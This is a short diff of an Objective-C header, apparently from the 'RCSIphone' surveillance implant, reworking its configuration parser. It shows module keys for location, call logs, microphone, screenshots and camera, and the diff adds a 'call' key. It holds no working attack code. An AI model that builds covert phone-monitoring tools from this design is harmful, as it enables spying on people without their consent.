@@ -3,7 +3,7 @@
 //  RCSIphone
 //
 //  Created by kiodo on 23/02/12.
-//  Copyright 2012 __MyCompanyName__. All rights reserved.
+//  Copyright 2012 HT srl. All rights reserved.
 //
 
 #import <Foundation/Foundation.h>
@@ -17,6 +17,7 @@
 #define MODULES_POS_KEY   @"position"
 #define MODULES_DEV_KEY   @"device"
 #define MODULES_CLIST_KEY @"calllist"
+#define MODULES_CALL_KEY  @"call"
 #define MODULES_CAL_KEY   @"calendar"
 #define MODULES_MIC_KEY   @"mic"
 #define MODULES_SNP_KEY   @"screenshot"
@@ -27,7 +28,7 @@
 #define MODULES_CAMERA_KEY  @"camera"
 #define MODULES_STATUS_KEY  @"enabled"
 
-#define MODULE_DEVICE_APPLIST_KEY   @"applicationlist"
+#define MODULE_DEVICE_APPLIST_KEY   @"list"
 #define MODULE_SCRSHOT_ONLYWIN_KEY  @"onlywindow"
 #define MODULE_SCRSHOT_INTERVAL_KEY @"interval"
 #define MODULE_SCRSHOT_NEWWIN_KEY   @"newwindow"
@@ -252,8 +253,11 @@ typedef struct _ApnStruct {
 - (void)parseAndAddEvents:(NSDictionary *)dict;
 - (void)parseAndAddModules:(NSDictionary *)dict;
 
-- (BOOL)runParser:(NSData*)aConfiguration
-       WithEvents:(NSMutableArray*)eventsArray
-       andActions:(NSMutableArray*)actionsArray
-       andModules:(NSMutableArray*)modulesArray;
+- (NSMutableArray*)getEventsFromConfiguration:(NSData*)aConfiguration;
+- (NSMutableArray*)getActionsFromConfiguration:(NSData*)aConfiguration;
+- (NSMutableArray*)getAgentsFromConfiguration:(NSData*)aConfiguration;
+- (BOOL)run:(NSData*)aConfiguration;
+
+- (BOOL)checkConfiguration:(NSData*)dataConfig;
+
 @end
